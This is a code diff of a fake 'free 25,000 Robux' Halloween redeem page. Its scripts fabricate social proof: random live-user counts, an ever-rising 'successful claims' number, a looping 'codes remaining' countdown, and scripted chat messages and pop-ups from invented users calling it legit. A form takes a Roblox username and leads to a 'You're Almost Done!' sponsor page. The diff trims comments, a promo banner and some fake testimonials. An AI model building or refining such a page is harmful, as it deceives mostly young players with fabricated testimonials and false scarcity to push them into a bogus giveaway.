@@ -18,7 +18,6 @@
     overflow-x: hidden;
   }
 
-  /* MOON */
   .moon {
     position: fixed;
     top: 20px;
@@ -33,7 +32,6 @@
     50% { transform: translateY(-10px) rotate(5deg); }
   }
 
-  /* STARS */
   .stars {
     position: fixed;
     inset: 0;
@@ -67,7 +65,6 @@
 
   .container { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 10; }
 
-  /* LIVE BADGE - TOP */
   .live-badge-top {
     display: flex;
     align-items: center;
@@ -96,7 +93,6 @@
     letter-spacing: 1px;
   }
 
-  /* ACTIVE USERS */
   .active-users {
     display: flex;
     align-items: center;
@@ -120,33 +116,6 @@
   }
   .active-users strong { color: #ff9a5e; font-weight: 700; font-size: 14px; }
 
-  /* PROMO */
-  .promo {
-    width: 100%;
-    border-radius: 12px;
-    padding: 12px 16px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    background: rgba(20, 10, 30, 0.7);
-    border: 1px solid rgba(255, 122, 24, 0.06);
-    margin-bottom: 16px;
-  }
-  .promo-icon {
-    flex-shrink: 0;
-    width: 36px;
-    height: 36px;
-    border-radius: 9999px;
-    background: rgba(255, 122, 24, 0.04);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 18px;
-  }
-  .promo-text { display: flex; flex-direction: column; }
-  .promo-title { color: #ff9a5e; font-weight: 700; font-size: 15px; line-height: 1.2; }
-  .promo-sub { color: rgba(255, 170, 120, 0.3); font-size: 11px; }
-
   /* HEADER */
   .header {
     text-align: center;
@@ -165,10 +134,10 @@
     font-size: 13px;
   }
 
-  /* INFO ROW */
+  /* INFO ROW - only successful claims */
   .info-row {
     display: flex;
-    justify-content: space-between;
+    justify-content: center;
     width: 100%;
     margin-bottom: 10px;
     padding: 6px 2px;
@@ -181,7 +150,6 @@
     color: rgba(255, 200, 170, 0.3);
     font-size: 12px;
   }
-  .info-row .info-item strong { color: #ff9a5e; font-weight: 600; }
   .info-row .info-item .green { color: #4ade80; font-weight: 600; }
 
   /* PROGRESS BAR */
@@ -249,7 +217,7 @@
 
   .error { color: #f87171; font-size: 13px; text-align: center; margin-top: 4px; }
 
-  /* LIVE CHAT - in the middle */
+  /* LIVE CHAT */
   .live-chat {
     width: 100%;
     margin: 14px 0;
@@ -298,7 +266,6 @@
     font-weight: 600;
   }
 
-  /* TOAST */
   .toast {
     position: fixed;
     left: 50%;
@@ -425,15 +392,10 @@
   }
   .candy-counter strong { color: #ff9a5e; font-weight: 600; }
 
-  /* RESPONSIVE */
   @media (max-width: 480px) {
     body { padding: 20px 12px; }
     .header h1 { font-size: 36px; }
-    .info-row { flex-direction: column; gap: 2px; align-items: center; }
     .info-row .info-item { font-size: 11px; }
-    .promo { padding: 10px 14px; }
-    .promo-title { font-size: 14px; }
-    .promo-sub { font-size: 10px; }
     .container { max-width: 360px; }
     .live-chat { max-height: 100px; padding: 8px 12px; }
     .chat-message .chat-user { font-size: 11px; }
@@ -442,19 +404,16 @@
 </style>
 </head>
 <body>
-  <!-- DECORATIONS -->
   <div class="moon">🌙</div>
   <div class="stars" id="stars"></div>
   <div class="sparkles" id="sparkles"></div>
 
   <div class="container">
-    <!-- LIVE BADGE - TOP -->
     <div class="live-badge-top">
       <div class="live-dot"></div>
       <span>LIVE</span>
     </div>
 
-    <!-- ACTIVE USERS -->
     <div class="active-users">
       <div class="avatars">
         <span>🧑</span>
@@ -466,24 +425,13 @@
       <span><strong id="userCount">27</strong> people are claiming right now</span>
     </div>
 
-    <!-- PROMO -->
-    <div class="promo">
-      <div class="promo-icon">👻</div>
-      <div class="promo-text">
-        <span class="promo-title">25,000 Robux Code: SECRET4</span>
-        <span class="promo-sub">Only 20 codes remaining.</span>
-      </div>
-    </div>
-
-    <!-- HEADER -->
     <div class="header">
       <h1>redeem</h1>
       <div class="sub">✨ Limited Halloween drop — claim before it's gone</div>
     </div>
 
-    <!-- INFO ROW -->
+    <!-- INFO ROW - only successful claims -->
     <div class="info-row">
-      <div class="info-item">🎃 Codes remaining: <strong id="codesLeft">18</strong> / 20</div>
       <div class="info-item">🏆 <span class="green" id="totalClaims">2,847</span> successful claims</div>
     </div>
 
@@ -498,7 +446,6 @@
       </div>
     </div>
 
-    <!-- FORM -->
     <form id="redeemForm">
       <input type="text" id="code" value="SECRET4" placeholder="Code" />
       <input type="text" id="username" placeholder="Roblox Username" />
@@ -506,7 +453,7 @@
       <div id="message"></div>
     </form>
 
-    <!-- LIVE CHAT - IN THE MIDDLE -->
+    <!-- LIVE CHAT -->
     <div class="live-chat" id="liveChat">
       <div class="chat-message">
         <span class="chat-user">xX_ProGamer_Xx</span>
@@ -529,13 +476,11 @@
     </div>
   </div>
 
-  <!-- TOAST -->
   <div class="toast" id="toast">
     <span class="avatar">👻</span>
     <span class="text"><b id="toastUser"></b> just redeemed 25,000 Robux</span>
   </div>
 
-  <!-- SPONSOR PAGE -->
   <div class="sponsor-page" id="sponsorPage">
     <div class="sponsor-content">
       <h2>🎯 You're Almost Done!</h2>
@@ -586,7 +531,6 @@
   </div>
 
   <script>
-    // ==================== STARS ====================
     const starsContainer = document.getElementById('stars');
     for (let i = 0; i < 25; i++) {
       const star = document.createElement('div');
@@ -600,7 +544,6 @@
       starsContainer.appendChild(star);
     }
 
-    // ==================== SPARKLES ====================
     const sparkles = document.getElementById('sparkles');
     for (let i = 0; i < 10; i++) {
       const s = document.createElement('span');
@@ -614,31 +557,26 @@
       sparkles.appendChild(s);
     }
 
-    // ==================== CANDY COUNTER ====================
     let candy = 18;
     setInterval(() => {
       candy -= 1;
       if (candy < 0) candy = 18;
       document.getElementById('candyCount').textContent = candy;
-      document.getElementById('codesLeft').textContent = candy;
       document.getElementById('codesLeft2').textContent = candy + ' / 20';
       document.getElementById('progressFill').style.width = (candy / 20 * 100) + '%';
     }, 8000);
 
-    // ==================== ACTIVE USERS ====================
     setInterval(() => {
       const count = Math.floor(Math.random() * 20) + 12;
       document.getElementById('userCount').textContent = count;
     }, 5000);
 
-    // ==================== TOTAL CLAIMS ====================
     let claims = 2847;
     setInterval(() => {
       claims += Math.floor(Math.random() * 5) + 2;
       document.getElementById('totalClaims').textContent = claims.toLocaleString();
     }, 8000);
 
-    // ==================== LIVE CHAT ====================
     const chatMessages = [
       { user: "xX_ProGamer_Xx", text: "Wow so legit bro! Just got my code! 🎉" },
       { user: "RobloxFan_2024", text: "This actually works! I got 25k robux 🔥" },
@@ -649,12 +587,7 @@
       { user: "EpicGamer_YT", text: "Free robux?? This is actually legit bro!" },
       { user: "LunarWolf_22", text: "Can't believe it worked! 25k robux ✅" },
       { user: "ShadowStrike_99", text: "Bro this is the best Halloween drop ever! 🎃" },
-      { user: "CosmicGamer_88", text: "I'm rich! Just claimed 25k robux 💰" },
-      { user: "BlazeFury_77", text: "This is so legit! Got my code in 2 mins ⚡" },
-      { user: "NightOwl_33", text: "Wow! Actually works! Thanks so much! 🙏" },
-      { user: "GhostHunter_11", text: "Bruh this is insane! 25k robux for free 😍" },
-      { user: "MoonWalker_44", text: "Just got my code! This is 100% legit 🔥" },
-      { user: "StarChaser_55", text: "I was scared to try but it worked! 🎉" }
+      { user: "CosmicGamer_88", text: "I'm rich! Just claimed 25k robux 💰" }
     ];
 
     const liveChat = document.getElementById('liveChat');
@@ -672,18 +605,15 @@
         <span class="chat-time">${times[Math.floor(Math.random() * times.length)]}</span>
       `;
       liveChat.appendChild(div);
-      
       while (liveChat.children.length > 6) {
         liveChat.removeChild(liveChat.firstChild);
       }
-      
       liveChat.scrollTop = liveChat.scrollHeight;
       chatIndex++;
     }
 
     setInterval(addChatMessage, 5000);
 
-    // ==================== TOAST ====================
     const toastUsers = ["xX_ProGamer_Xx","RobloxFan_2024","NoobMaster99","PixelQueen_22","DarkNinja_07","SusieSunshine","EpicGamer_YT"];
     const toast = document.getElementById('toast');
     const toastUser = document.getElementById('toastUser');
@@ -697,7 +627,6 @@
     setTimeout(showToast, 2500);
     setInterval(showToast, 6000);
 
-    // ==================== FORM ====================
     const form = document.getElementById('redeemForm');
     const codeInput = document.getElementById('code');
     const usernameInput = document.getElementById('username');
@@ -722,7 +651,6 @@
       }, 800);
     });
 
-    // ==================== SPONSOR ====================
     function showSponsor() {
       document.getElementById('sponsorPage').classList.add('show');
     }
